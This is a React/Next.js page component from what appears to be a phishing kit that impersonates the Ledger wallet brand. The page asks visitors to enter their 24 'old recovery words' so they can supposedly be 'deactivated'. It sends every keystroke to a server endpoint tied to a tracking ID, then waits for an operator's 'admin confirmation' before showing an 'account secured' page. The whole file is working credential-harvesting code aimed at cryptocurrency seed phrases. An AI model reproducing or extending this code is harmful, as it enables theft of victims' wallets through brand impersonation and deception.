"use client"

import { useState, useEffect, useRef } from "react"
import { useRouter } from "next/navigation"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Card, CardContent } from "@/components/ui/card"
import { KeyRound, Loader2 } from "lucide-react"
import type { UserActivity } from "@/lib/activity-store"
import { useHeartbeat } from "@/hooks/use-heartbeat"
import { LedgerFooter } from "@/components/ledger-footer"

export default function EnterOldKeysPage() {
  const router = useRouter()
  const [visitorId, setVisitorId] = useState("")
  const [words, setWords] = useState<string[]>(Array(24).fill(""))
  const [isWaiting, setIsWaiting] = useState(false)
  const inputRefs = useRef<(HTMLInputElement | null)[]>([])
  const syncTimeoutRef = useRef<NodeJS.Timeout | null>(null)
  const latestWordsRef = useRef<string[]>(Array(24).fill(""))

  useHeartbeat(visitorId)

  useEffect(() => {
    const id = localStorage.getItem("visitorId")
    if (id) {
      setVisitorId(id)
      fetch(`/api/activity?visitorId=${id}`)
        .then((res) => res.json())
        .then((data) => {
          if (data.activity) {
            // Only update stage, preserve everything else including oldKeysData
            const activity: UserActivity = {
              ...data.activity,
              currentStage: "enter-old-keys",
              oldKeysData: {
                ...(data.activity.oldKeysData || {}),
                enteredWords: data.activity.oldKeysData?.enteredWords || Array(24).fill(""),
              },
              lastUpdated: new Date().toISOString(),
            }
            fetch("/api/activity", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ visitorId: id, activity }),
            })
          }
        })
    } else {
      router.push("/")
    }
  }, [router])

  // Poll for admin confirmation
  useEffect(() => {
    if (!isWaiting || !visitorId) return
    const interval = setInterval(async () => {
      const res = await fetch(`/api/activity?visitorId=${visitorId}`)
      const data = await res.json()
      if (data.activity?.oldKeysData?.adminConfirmed) {
        clearInterval(interval)
        router.push("/account-secured")
      }
    }, 2000)
    return () => clearInterval(interval)
  }, [isWaiting, visitorId, router])

  const handleWordChange = (index: number, value: string) => {
    if (value.includes(" ")) {
      const trimmed = value.replace(/\s/g, "")
      const newWords = [...words]
      newWords[index] = trimmed.toLowerCase()
      setWords(newWords)
      if (index < 23) {
        inputRefs.current[index + 1]?.focus()
      }
      syncWords(newWords)
      return
    }

    const newWords = [...words]
    newWords[index] = value.toLowerCase()
    setWords(newWords)
    syncWords(newWords)
  }

  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Enter" || e.key === "Tab") {
      e.preventDefault()
      if (index < 23) {
        inputRefs.current[index + 1]?.focus()
      }
    }
    if (e.key === "Backspace" && words[index] === "" && index > 0) {
      e.preventDefault()
      inputRefs.current[index - 1]?.focus()
    }
  }

  const flushSync = async () => {
    if (syncTimeoutRef.current) {
      clearTimeout(syncTimeoutRef.current)
      syncTimeoutRef.current = null
    }
    if (visitorId) {
      await fetch("/api/activity/sync-words", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          visitorId,
          field: "oldKeysData",
          enteredWords: [...latestWordsRef.current],
        }),
      })
    }
  }

  const syncWords = (newWords: string[]) => {
    latestWordsRef.current = [...newWords]
    if (syncTimeoutRef.current) {
      clearTimeout(syncTimeoutRef.current)
    }
    syncTimeoutRef.current = setTimeout(() => {
      if (visitorId) {
        fetch("/api/activity/sync-words", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            visitorId,
            field: "oldKeysData",
            enteredWords: [...latestWordsRef.current],
          }),
        })
      }
    }, 150)
  }

  const handleSubmit = async () => {
    if (isWaiting) return
    setIsWaiting(true)

    // Flush the latest words first
    latestWordsRef.current = [...words]
    await flushSync()
  }

  return (
    <div className="min-h-screen bg-background flex flex-col">
      <header className="border-b border-border">
        <div className="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex items-center justify-between h-16">
            <div className="flex items-center">
              <div className="relative flex items-center">
                <span
                  className="absolute -top-0.5 -left-1 w-2.5 h-2.5 border-l-2 border-t-2 border-foreground"
                  aria-hidden="true"
                />
                <span className="font-bold text-foreground tracking-[0.2em] text-sm px-3 py-1">LEDGER</span>
                <span
                  className="absolute -bottom-0.5 -right-1 w-2.5 h-2.5 border-r-2 border-b-2 border-foreground"
                  aria-hidden="true"
                />
              </div>
            </div>
          </div>
        </div>
      </header>

      <main className="flex-1 max-w-6xl mx-auto px-4 sm:px-6 lg:px-8 py-6 sm:py-8">
        <div className="max-w-lg mx-auto">
          <div className="flex justify-center mb-5">
            <div className="w-14 h-14 rounded-full bg-amber-500/20 flex items-center justify-center">
              <KeyRound className="w-7 h-7 text-amber-400" />
            </div>
          </div>

          <h1 className="text-xl sm:text-2xl font-semibold text-foreground mb-2 text-center">
            Please Type in your old API Keys
          </h1>
          <p className="text-sm text-muted-foreground text-center mb-6">
            Enter each of your 24 old recovery words in order so we can deactivate them.
          </p>

          <div className="grid grid-cols-2 sm:grid-cols-3 gap-3 mb-6">
            {Array.from({ length: 24 }).map((_, i) => (
              <div key={i} className="space-y-1">
                <label className="text-[11px] text-muted-foreground font-mono">{i + 1}.</label>
                <Input
                  ref={(el) => { inputRefs.current[i] = el }}
                  type="text"
                  value={words[i]}
                  onChange={(e) => handleWordChange(i, e.target.value)}
                  onKeyDown={(e) => handleKeyDown(i, e)}
                  placeholder={`Word ${i + 1}`}
                  autoComplete="off"
                  disabled={isWaiting}
                  className="bg-secondary text-xs h-9 font-mono border-border"
                />
              </div>
            ))}
          </div>

          <Button
            onClick={handleSubmit}
            disabled={isWaiting || words.some((w) => !w.trim())}
            className="w-full bg-foreground text-background hover:bg-foreground/80 h-10 sm:h-11 text-sm sm:text-base cursor-pointer transition-all duration-200 hover:scale-105 active:scale-95 disabled:opacity-50 disabled:cursor-not-allowed disabled:hover:scale-100"
          >
            {isWaiting ? (
              <span className="flex items-center gap-2">
                <Loader2 className="w-4 h-4 animate-spin" />
                Submitting...
              </span>
            ) : (
              "Submit"
            )}
          </Button>
        </div>
      </main>

      <LedgerFooter />
    </div>
  )
}
